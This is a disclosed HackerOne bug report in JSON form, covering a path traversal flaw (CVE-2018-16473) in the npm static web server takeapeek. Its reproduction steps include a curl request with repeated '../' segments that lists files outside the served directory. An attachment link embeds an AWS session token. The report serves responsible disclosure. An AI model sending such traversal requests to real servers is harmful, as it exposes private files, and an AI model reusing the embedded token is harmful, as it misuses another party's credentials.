@@ -1,0 +1,189 @@
+{
+  "id": 403736,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDM3MzY=",
+  "url": "https://hackerone.com/reports/403736",
+  "title": "[takeapeek] Path traversal allow to expose directory and files",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-01T05:13:41.721Z",
+  "submitted_at": "2018-09-01T05:13:41.721Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "abdilahrf_",
+    "url": "/abdilahrf_",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bsm9e70lm64ys0s633r55gvcmhcn/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-16473"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-11-02T10:37:18.721Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-11-02T10:37:02.584Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report Path Travelsal in takeapeek\nIt allows attacker to list directory and files.\n\n# Module\n\n**module name:** takeapeek\n**version:** 0.2.2\n**npm page:** `https://www.npmjs.com/package/takeapeek`\n\n## Module Description\n\nA simple static webserver with only one command. Heavily inspired by glance, this is really more of a learning experience then anything.\n\n## Module Stats\n\n~100 downloads per month \n\n# Vulnerability\n\n## Vulnerability Description\n\nAttacker was able to exploit path traversal and view sensitive directory and files.\n\n## Steps To Reproduce:\n\n- `npm i takeapeek`\n- `node node_modules/takeapeek/dist/bin.js`\n- `curl --path-as-is http://localhost:3141/../../../../../../`\n\nF340897\n\n\n## Supporting Material/References:\n\n- OS: Windows 10\n- NODE: v10.8.0\n- NPM : 6.2.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nIt allows attacker to list directory and files.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 340897,
+      "file_name": "takeapeek-pathtraversal.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/340/897/ecd3fbb8167e92eb3f7b5a95269ae8241219f7ec/takeapeek-pathtraversal.PNG?response-content-disposition=attachment%3B%20filename%3D%22takeapeek-pathtraversal.PNG%22%3B%20filename%2A%3DUTF-8%27%27takeapeek-pathtraversal.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJPLT3MP%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T153804Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGGYU4UMiXbZMsEGIUjHD2obpwi9VOjwzNixKIESKiECAiEAvjI8FrHE%2BCn68%2Bjx0moQosjLsr6rB7cR9sUlsRycm9IqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDFAiuftJg3CjfJZffSqOBWhgVxolvhwFp%2FSfipAjuRKqSXxMV9RyyIZ9O2o1wQjZ6ll7hDeqOMq4LTPUZF5dVtiC4dhB06tJ3GCL1oWnIvJQlmAF%2BKOE7IkGM6i78HK9PHw2ANgSGG0ispIugDP5UWX8TTIgEcHg8AbrLvdM3uqSqZAN4zQ%2FkQdjlVlB9cQSVYv56JgNYAYEyrxKDi9uduQkV%2F7Z3STxqLdJ5HpcPSj0xbRBm6zYgsmU%2Fc%2BUMRLzfCPzzn8QuDPObgDjmGxzljajDInrnSlC793216jLHPnzSqOsvezRUQ3b9e80xvsLo3g%2Fo2KkSjO4TkIZmSFfzZjsNL4VuQCUoEgMiAAOD%2FHLZo83foYZAB8IH%2F%2BzY46klo4TwJ%2BUQTMTLbztOPD2Cl8aHnLQ61ae43nAv92Ko%2Fn8JW%2BaMiR5ttTBO%2FsHbZamZMoIxSjB1KuFu871Sb6%2BkP0K3svCi3kzuoaViwxRoLSDqEH9zINSIK9x%2FMsJYKWkDrp1GyT991WU4bhAPjWEqMJ6hS3VSFedDr8%2BCoKBwbtr1DldTb7MNtvlQh7%2BX7u03PVq0I4M51jMaUizPZ5XKKsAwzYJ8J%2Bmpeb7wNpcC%2FY1TRVniDZvVZHzqQXiraIHEwUXmB8W4O3rgI0JHZamdPK2HY1Ou7%2Bd%2Bw3trIJnsoSLOk5G9ISMupVs5NrIo%2Fq4ZZXs0Msl5IFGa40%2F87zphi%2BJ00ZqxqfIZfoE8q46Q3%2Bsfy6VhfHFJ0cuZLHTWAQllZkMaQB9Lfc%2B9EHqqxS7lvq3xeMrPgUrK8wagzSRVFKU4xRntv9ny3iRdX7NaqRiSvysWndjZj%2FoPf%2FjqFRNLHSQTCziR6prj8bp3%2BdLzxEx1c48fwfjEXh6hqNFWTDjh5bRBjqxAdXC1WyfmPKMI%2BlVXGKeQY6lVNEiAWbmUPmfXEDqqh5eGD44M46lzlkn5i8MZf3ZCxaviD5kNANvq%2BWYTkZ6id2KcfS4xOXMTWPEyOltLAbHW4QveKrd9faOnBVziZaZ8FuaNGg2789y223%2FuZynZQFAMH32UHMmOG%2F7v5q%2BF%2BEhw6OIwb8Yxb4JSgcvWssMiknUNz0nKbbhhjHIAfRAVbKmFhfbaX15ekLpw1F1wFPwSQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=69ff2ca0e9cffbcc13adcccf619e0ba375f2c02cde3fd18129f1d305c433ea10",
+      "file_size": 74444,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-12-02T10:37:02.652Z",
+  "allow_singular_disclosure_after": -237099661.40288046,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "bobo_ka",
+    "abdilahrf_",
+    "n00bsec",
+    "cryptographer",
+    "whichisbad",
+    "apridos"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 14209,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "takeapeek",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
